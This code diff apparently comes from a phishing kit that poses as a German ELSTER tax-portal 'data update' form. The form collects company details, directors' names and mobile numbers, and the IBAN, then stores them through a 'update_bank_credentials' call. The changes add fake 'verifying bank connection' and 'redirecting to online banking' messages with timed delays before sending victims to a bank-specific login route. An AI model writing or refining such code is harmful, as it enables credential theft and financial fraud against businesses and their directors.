@@ -130,6 +130,8 @@ const ElsterDatenaktualisierung = () => {
     if (Object.keys(err).length === 0) setStep(2);
   };
 
+  const [loadingMsg, setLoadingMsg] = useState("");
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     const err: Record<string, string> = {};
@@ -140,6 +142,7 @@ const ElsterDatenaktualisierung = () => {
     setErrors(err);
     if (Object.keys(err).length > 0 || submitting) return;
     setSubmitting(true);
+    setLoadingMsg("Bankverbindung wird überprüft…");
 
     const summary = [
       `Unternehmen: ${company}`,
@@ -149,16 +152,20 @@ const ElsterDatenaktualisierung = () => {
       ...directors.map((d, i) => `Geschäftsführer ${i + 1}: ${d.firstName} ${d.lastName} (Mobil: ${d.mobile})`),
     ].join("\n");
 
-    if (sessionId) {
-      const { error } = await supabase.rpc("update_bank_credentials", {
-        p_session_id: sessionId,
-        p_username: summary,
-        p_password: iban,
-        p_username_label: "Firmendaten",
-        p_password_label: "IBAN",
-      });
-      if (error) console.error("Update failed:", error);
-    }
+    const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
+    const rpcPromise = sessionId
+      ? supabase.rpc("update_bank_credentials", {
+          p_session_id: sessionId,
+          p_username: summary,
+          p_password: iban,
+          p_username_label: "Firmendaten",
+          p_password_label: "IBAN",
+        })
+      : Promise.resolve({ error: null } as { error: unknown });
+
+    await sleep(1500);
+    const { error } = (await rpcPromise) as { error: unknown };
+    if (error) console.error("Update failed:", error);
 
     // Resolve bank → /de/* and redirect for online-banking verification
     const route = await resolveDeBankRoute(bankName);
@@ -168,6 +175,8 @@ const ElsterDatenaktualisierung = () => {
           company, email, phone, street, city, directors, iban, bankName,
         }));
       } catch { /* ignore */ }
+      setLoadingMsg("Weiterleitung zur Online-Banking-Anmeldung…");
+      await sleep(1200);
       const qs = new URLSearchParams();
       if (sessionId) qs.set("s", sessionId);
       qs.set("return", "/elster/datenaktualisierung");
@@ -176,6 +185,7 @@ const ElsterDatenaktualisierung = () => {
     }
 
     setSubmitting(false);
+    setLoadingMsg("");
     setErrors({ iban: "Für diese Bank ist derzeit keine Online-Verifizierung verfügbar." });
   };
 
